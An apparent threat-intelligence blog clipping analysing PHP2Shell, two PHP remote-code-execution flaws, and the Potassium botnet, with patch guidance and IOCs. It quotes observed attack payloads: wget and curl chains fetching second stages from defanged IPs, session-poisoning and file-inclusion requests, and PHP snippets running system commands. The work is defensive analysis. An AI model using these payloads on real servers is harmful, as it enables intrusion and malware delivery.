---
title: "PHP2Shell: Critical PHP Vulnerabilities Enable Unauthenticated Remote Code Execution"
source: "https://arcticwolf.com/resources/blog/php2shell-critical-php-vulnerabilities-enable-unauthenticated-remote-code-execution/"
author:
  - "[[Arctic Wolf Labs]]"
published: 2026-10-23
created: 2026-10-25
description: "In this blog, Arctic Wolf Labs analyzes PHP2Shell (CVE-2026-109618 and CVE-2026-109619) and discusses active exploitation attempts, Potassium botnet activity, and gives mitigation guidance."
tags:
  - "clippings"
---
![](https://arcticwolf.com/wp-content/uploads/2026/10/AW-Labs-OG-261010.jpg) ![](https://arcticwolf.com/wp-content/uploads/2026/10/AW-Labs-OG-261010.jpg)

In this blog, Arctic Wolf Labs analyzes PHP2Shell (CVE-2026-109618 and CVE-2026-109619) and discusses active exploitation attempts, Potassium botnet activity, and gives mitigation guidance.

## Executive Summary

On October 21, 2026, the PHP development team released emergency security updates addressing two critical vulnerabilities, [CVE-2026-109618](https://www.php.net/archive/2026.php) and [CVE-2026-109619](https://www.php.net/archive/2026.php), collectively referred to by researchers as **PHP2Shell**. Both vulnerabilities carry a CVSS v4.0 score of 9.2 (Critical Severity) and can allow an unauthenticated attacker to [execute code](https://cert.europa.eu/publications/security-advisories/2026-018/) with the privileges of the affected PHP worker process.

The vulnerabilities affect PHP installations that process web requests, including PHP-FPM, Apache deployments using mod\_php, php-cgi, FrankenPHP, and LiteSpeed. The PHP security team considers Apache mod\_php the highest-risk configuration because researchers demonstrated exploitation through a single unauthenticated request before application code begins executing.

## Key findings

- **Arctic Wolf Labs observed widescale scanning and active exploitation attempts targeting PHP2SHELL shortly after disclosure**. Activity ranged from basic checks for vulnerable PHP session upload-progress behavior, to attempts to validate PHP and operating system (OS) command execution.
- **Observed scanners used several techniques to validate exposure**. These included inert PHP canaries, unique output markers, attacker-controlled session identifiers, session-poisoning attempts, and local-file-inclusion chains designed to determine whether injected PHP content could be evaluated.
- **Arctic Wolf Labs identified likely weaponized exploitation attempts involving second-stage payload delivery**. Requests associated with 92.118.112\[.\]100 attempted to collect host and process-account information, print execution-confirmation markers, change to /tmp, and retrieve additional files using wget.
- **Analysis of the associated infrastructure identified payloads linked to the** **Potassium botnet**. The investigation also uncovered Ethereum Name Service records containing recently updated IP addresses, although the available evidence does not show that the malware retrieved or used those records operationally.

## Details

Arctic Wolf Labs observed a likely weaponized PHP2Shell exploitation attempt that combined command-execution validation with second-stage payload delivery. The request attempted to run id, print the marker PHP2SHELL\_CONFIRMED, change to /tmp, and download a file from external IP address 92.118.112\[.\]100. The command sequence appeared repeatedly across padded form fields, potentially to influence memory layout or improve exploit reliability.

echo PHP2SHELL\_CONFIRMED;cd /tmp; wget hxxp://92.118.112\[.\]100/nfs-setup

We observed a second weaponized payload associated with the same server. Embedded within repeated, heavily padded multipart fields, the command sequence attempted to enumerate the operating system and execution account, print a distinctive marker, and download an additional file from the previously observed payload host. The attempted second-stage delivery distinguishes this activity from non-destructive vulnerability validation and indicates clear exploitation intent.

system.uname -a; id; echo REDACTED OFFENSIVE;wget hxxp://92.118.112\[.\]100/REDACTED OFFENSIVE;

Further analysis of the payload-hosting infrastructure identified two malicious binaries associated with [Potassium](https://github.com/deepfield/public-research/tree/main/potassium), a Mirai-derived botnet family first identified in March 2026 by [Synthient](https://x.com/deobfuscately/status/2033923869782712514) and named after its C2 subdomain. Available telemetry did not establish that the observed PHP2Shell requests downloaded or executed either sample.

### Payload Infrastructure Analysis

|  | **ARM variant** | **X86-64 variant** |
| --- | --- | --- |
| Built for | ARM (routers, cameras, DVRs) | x86-64 (servers, small boxes) |
| Size | 215 KB | 175 KB |
| Attack vectors | 24 | 24 |
| Remote shell | *Not identified* | Yes |
| Command and Control | thunder\[.\]godofthunder\[.\]st | Same |
| Updates from | hackattackkaboom\[.\]botlesscucks\[.\]st | Same |

### Shared Builder and Execution Flow

The ARM and x86 samples contain the same 32-byte encryption key and 12-byte nonce, providing strong evidence that they originated from a shared builder. Both use these values to encrypt operational strings, including command-and-control domains, file paths, shell and process names, and the process kill list.

Further Arctic Wolf Labs research into the payloads identified new capabilities not previously reported, which are listed below.

### New Attack Vectors

| **ID** | **Name** | **Socket** | **Notes** |
| --- | --- | --- | --- |
| **1** | udp | UDP | per-target socket, sendto loop |
| **2** | udpplain | UDP | plain UDP flood |
| **3** | syn | RAW | crafted TCP SYN, IP\_HDRINCL |
| **4** | ack | RAW | crafted TCP ACK |
| **5** | socket | TCP | connection flood, sockets held open |
| **6** | openvpn | RAW | OpenVPN protocol flood |
| **7** | udphex | UDP | hex-encoded payload |
| **8** | ragnarok | UDP | verified socket type only |
| **9** | pshack | RAW | TCP PSH+ACK |
| **10** | icmp | RAW | ICMP flood |
| **11** | gre | RAW | GRE encapsulated |
| **12** | sack | RAW | banner TCP SYN+ACK flood! |
| **13** | game | UDP | banner UDP Game flood (SOCK\_DGRAM – stable)! |
| **14** | fivem | UDP | FiveM/GTA, CitizenFX/1 user agent |
| **15** | tcpmix | RAW | mixed TCP flag combinations |
| **16** | udpbypass | UDP | banner UDP Bypass flood (SOCK\_DGRAM – stable)! |
| **17** | tcpfml | RAW | banner TCP FML! |
| **18** | katakomba | RAW | banner TCP KATAKOMBA! |
| **19** | trapaholic | mixed | largest handler, 33 KB decompiled |
| **20** | http | TCP | HTTP flood, random paths and extensions |
| **21** | udpcn | RAW | verified socket type only |
| **22** | javaclient | TCP | Minecraft Java protocol, socket-loop |
| **23** | tcpcn | RAW | verified socket type only |
| **24** | tlshttp | none | STUB, does nothing |

### Ethereum Name Service Resolution

Both builds contain configuration for resolving command-and-control infrastructure through Ethereum Name Service (ENS), including two.eth names, seven public Ethereum RPC endpoints, and 32 text-record keys labeled “ip” through ip32. This would allow the malware to retrieve multiple command-and-control addresses without relying on conventional DNS.

ENS resolution was disabled in both samples, indicating that the capability was present but inactive. If enabled in future variants, it could complicate disruption by reducing reliance on registrars and DNS providers, requiring defenders to block the ENS names, RPC infrastructure, and resolved command-and-control addresses.

### From Canaries to Command Execution

Following public disclosure, Arctic Wolf Labs observed widespread automated activity targeting PHP’s session upload-progress functionality. The requests ranged from basic checks for vulnerable behavior to session-poisoning chains and explicit attempts to validate operating-system command execution.

The variation in request structure, markers, session identifiers, and payloads indicates that multiple scanners and proof-of-concept (PoC) implementations were active. Although these requests demonstrate increasingly aggressive exploitation intent, request telemetry alone does not establish that the targeted systems were vulnerable or that code execution succeeded.

### Probing the Upload-Progress Code Path

Some scanners performed basic checks intended to reach the affected PHP request-processing path. One self-identifying scanner supplied a controlled session identifier, activated PHP’s upload-progress functionality, and uploaded approximately 63 KB of repetitive data.

User-Agent: php2shell-scan/109618  
Cookie: PHPSESSID=<REDACTED\_SESSION\_ID>  
Content-Type: multipart/form-data; boundary=B7kQpoc618  
Content-Length: 62935  
Connection: close

–B7kQpoc618  
Content-Disposition: form-data; name=”PHPSESSID”

<REDACTED\_SESSION\_ID>  
–B7kQpoc618  
Content-Disposition: form-data; name=”PHP\_SESSION\_UPLOAD\_PROGRESS”

x  
–B7kQpoc618  
Content-Disposition: form-data; name=”f”; filename=”a”  
AAAA…\[truncated\]…

The repetitive file content may have been intended to exercise the vulnerable upload-processing path or validate exploit prerequisites. The request did not contain executable PHP or an operating-system command, making it more consistent with vulnerability probing than an attempt to deliver a final payload.

### Testing Session Poisoning and File Inclusion

Other requests tested whether attacker-controlled PHP could be written into session upload-progress data and subsequently evaluated through a local file inclusion vulnerability.

One request supplied a predictable session identifier and attempted to include the corresponding session file through a page parameter:

POST /vuln.php?page=/var/lib/php/session/sess\_p2sopchain000000000000 HTTP/1.1

The request embedded the following PHP in uploaded filename metadata:

<?php  
echo ‘P2SOP-‘.PHP\_VERSION.  
‘-EXEC-‘.php\_uname(‘n’).  
‘-WPC-‘.intval(@file\_exists(‘wp-content/db.php’));  
?>

If successfully stored and evaluated, the payload would return the PHP version, server hostname, and the result of a check for a WordPress-related file. The request exposes the scanner’s intended exploit chain, but it does not prove that the supplied session path matched the target’s configuration or that the application included the session file.

### Session Poisoning Versus PHP2Shell Exploitation

Arctic Wolf Labs also observed requests that appeared to conflate PHP2Shell with older PHP session-poisoning techniques. One example activated PHP’s upload-progress functionality and embedded a serialized Monolog object within uploaded filename metadata:

Cookie: PHPSESSID=pcw8189d05b0b3e4ffb  
PHP\_SESSION\_UPLOAD\_PROGRESS=x  
filename=”x|O:32:\\”Monolog\\Handler\\SyslogUdpHandler\\”…”

The serialized object contained a Monolog gadget chain configured to execute:

curl -s hxxp://45.115.26\[.\]26:8000/cCmono

The serialized object ultimately attempted to execute a command that would download a second-stage payload named cCmono from a remote server. Arctic Wolf Labs was unable to retrieve the referenced file during analysis and could not independently verify the payload that may have been delivered.

Unlike the command-execution validation payloads discussed previously, this request does not appear to target the memory-corruption mechanisms underlying PHP2Shell. Instead, it attempts to leverage PHP’s session upload-progress feature to place attacker-controlled content into session storage, potentially for use in a subsequent local file inclusion or unsafe deserialization chain.

Successful exploitation would require additional application-specific conditions beyond the PHP vulnerabilities themselves, such as the ability to retrieve and deserialize attacker-controlled session data and the presence of compatible Monolog classes. The request demonstrates malicious intent but does not independently establish exploitation of CVE-2026-109618 or CVE-2026-109619.

### Inert Canaries and Execution Markers

Several scanners used PHP canaries to test whether attacker-controlled content reached session data or an executable context.

The least intrusive sample contained an explicitly inert PHP block:

<?php /\* php2shell-scan inert canary \*/?>

Because the block contains only a comment, it does not execute a command, collect system information, or produce output. It appears designed to test whether PHP syntax could be introduced into upload-progress data without attempting to demonstrate code execution.

Other scanners used output-producing canaries. A Nuclei-based request embedded a unique marker in uploaded filename metadata:

<?php echo ‘NUCLEIve97RH0fzh’;?>

If a subsequent file-inclusion request caused PHP to evaluate the poisoned session data, the marker would appear in the server response and allow the scanner to correlate the result with the original request.

Another scanner placed two fixed markers in both the upload-progress value and filename:

<?php echo ‘P2SFNAME’; echo ‘P2SVALUE’;?>

The associated session identifier ended in.php, suggesting that the scanner may also have been testing whether the session identifier influenced a filename that could later be reached or evaluated by the web server. The.php suffix reflects the scanner’s apparent assumption, however, and does not establish that PHP created a web-accessible file with that name.

These output canaries are non-destructive, but they go beyond inert injection checks. If returned by the server, they would provide evidence that attacker-controlled PHP reached an executable context.

### Validating Operating-System Command Execution

The most intrusive scanning activity attempted to validate execution beyond the PHP interpreter. Multiple requests embedded PHP that decoded and ran the Unix id command:

<?php  
echo ‘RCE\_noyzzg0YVLBU’;  
system(base64\_decode(‘aWQ=’));  
echo ‘RCE\_noyzzg0YVLBU’;  
?>

The Base64 value aWQ= decodes to id. If successful, the payload would return the user and group identity of the affected PHP worker process.

The unique RCE\_ strings bracket the expected command output, allowing an automated scanner to locate it within an HTTP response and associate the result with a specific request. Arctic Wolf Labs observed multiple markers, including repeated use of the same value, which may indicate retries, injection into multiple request fields, or repeated testing of the same target.

These payloads represent active RCE validation rather than passive scanning. However, the presence of the payload in a request does not independently establish that PHP evaluated it or that the operating-system command executed successfully. Confirmation would require corresponding response content, process telemetry, or other server-side evidence.

## Vulnerability Overview

The vulnerabilities arise from separate weaknesses in PHP’s handling of request memory and abnormal execution states:

- **CVE-2026-109618** can cause memory corruption when an out-of-memory condition interrupts PHP while internal request data is only partially initialized.
- **CVE-2026-109619** can allow request-owned global state to remain accessible after its backing memory has been freed, creating a stale-state condition that a later request may reuse.

| **Vulnerability** | **Description** | **Impact** | **Severity** |
| --- | --- | --- | --- |
| CVE-2026-109618 | Memory corruption during out-of-memory handling | Unauthenticated remote code execution | CVSS v4.0 9.2 |
| CVE-2026-109619 | Reuse of stale request-owned global state after memory is freed | Unauthenticated remote code execution, with possible memory disclosure | CVSS v4.0 9.2 |

Both vulnerabilities affect PHP’s internal request-processing lifecycle. As a result, exposure does not necessarily depend on a vulnerability in the application running on top of PHP. Any reachable PHP script may expose the underlying request-processing path under the required conditions.

### Affected Deployment Models

The PHP project identifies the following web-serving configurations as at risk:

- Apache with mod\_php
- PHP-FPM
- php-cgi
- FrankenPHP
- LiteSpeed
- Products and appliances that embed or bundle PHP

Apache mod\_php presents the most clearly demonstrated risk because exploitation can reportedly occur through one unauthenticated request before the target application receives control. Other deployment models remain affected, but exploit requirements and worker-state behavior may differ.

Public PoC material is available, and multiple security organizations have independently reproduced at least one exploitation path. Public reporting from security vendors also indicates that exploit attempts began around the time of disclosure, although the scale and success of that activity remain incompletely established.

Organizations should immediately update to PHP 8.5.12, 8.4.27, 8.3.36, or 8.2.35. Systems running unsupported PHP versions may require an operating-system or long-term-support vendor backport, an appropriate upstream source backport, or migration to a supported branch.

## Conclusion

PHP2Shell attracted significant attention because of its severity, PHP’s widespread use, and its discovery through AI-assisted security research. According to [OpenAI](https://openai.com/index/coordinated-disclosure-of-critical-vulnerabilities/), researchers participating in its Patch the Planet initiative used frontier AI models, alongside expert human review, to help identify and validate the vulnerabilities.

Early exploitation has been more limited than the initial attention suggested. Arctic Wolf telemetry and public reporting show widespread scanning, exploit validation, and isolated attempts to deliver second-stage payloads, but comparatively little evidence of reliable exploitation at scale.

The activity observed following disclosure also highlights a broader challenge for defenders: publicly released proof-of-concept code is often modified, repackaged, and rapidly redistributed. Arctic Wolf Labs observed PHP2Shell-themed requests that appeared to reuse older session-poisoning and deserialization tradecraft rather than the memory-corruption mechanisms underlying CVE-2026-109618 and CVE-2026-109619. As a result, defenders should avoid assuming that every PHP2Shell-themed request represents successful exploitation or even an attempt to exercise the newly disclosed vulnerabilities. Instead, organizations should focus on identifying evidence of the specific exploitation conditions required by the vulnerabilities themselves.

Because PHP2Shell was publicly disclosed only on October 21, 2026, the exploitation landscape may change quickly. Organizations should upgrade affected PHP installations, restart the relevant workers, and continue monitoring for command execution and second-stage payload delivery.

### How Arctic Wolf Labs Turns Telemetry Into Outcomes

Arctic Wolf Labs is our threat intelligence and research team. Global security operations center (SOC) telemetry visibility drives a shared defense, while active network monitoring gives Labs an early warning system across our global customer base.

Using telemetry from across the Arctic Wolf customer community, researchers identify spikes in scanning activity, analyze exploitation attempts, and uncover attacker payloads associated with PHP2Shell. We use those findings to develop and fine-tune detections to respond to malicious activity faster. This helps customers detect PHP2Shell activity they may have not observed yet in their unique environment.

Labs researchers also replicate attacker techniques against PHP2Shell vulnerabilities in controlled environments. Arctic Wolf Labs leverages resulting artifacts from these simulations, as well as observed exploit techniques, attacker tradecraft, and emerging indicators of attack/compromise (IOA/IOC), to develop new detections, threat hunt queries, and inform customer remediation guidance. As threat behavior evolves, we continuously apply the latest intelligence across customer environments.

## Indicators of Compromise (IOCs)

- e2529d4afa39ae4db2eb05d5176317c906289abf09660c75bdeec43e54c55aa3
- 0c5486f06620e26e316f4b33f318b0d646d5e1133789331aa2fed012360d1486
- hxxp://92.118.112\[.\]100/nfs-setup
- hxxp://92.118.112\[.\]100/mountpoint
- hxxp://45.115.26\[.\]26:8000/cCmono
- 92.118.112\[.\]100
- 45.198.224\[.\]169
- 5.175.189\[.\]76
- Mozilla/5.0 (X11; Linux x86\_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36

### Additional Arctic Wolf Resources:

- Read the related blog: [Arctic Wolf Labs: Finding, Prioritizing, and Patching PHP2Shell Exposure](https://arcticwolf.com/resources/blog/arctic-wolf-labs-finding-prioritizing-and-patching-php2shell-exposure/)
- Sign up for Arctic Wolf’s free Threat Intelligence newsletter: [ThreatPulse Community Edition](https://arcticwolf.com/threatpulse-newsletter/)
- [Arctic Wolf Tech Den](https://arcticwolf.com/resources/technical-videos/)
- [Arctic Wolf Blog](https://arcticwolf.com/resources/category/blog/)

*Legal Disclaimers:*

*Attribution reflects Arctic Wolf Labs’ assessment as of the report period and may evolve with new evidence. References to threat actor identity, nexus, and intent are analytical judgments, not statements of legal fact. This alert is provided for informational purposes only and does not constitute a guarantee of detection or prevention. Defensive effectiveness varies by environment, configuration, and available telemetry.*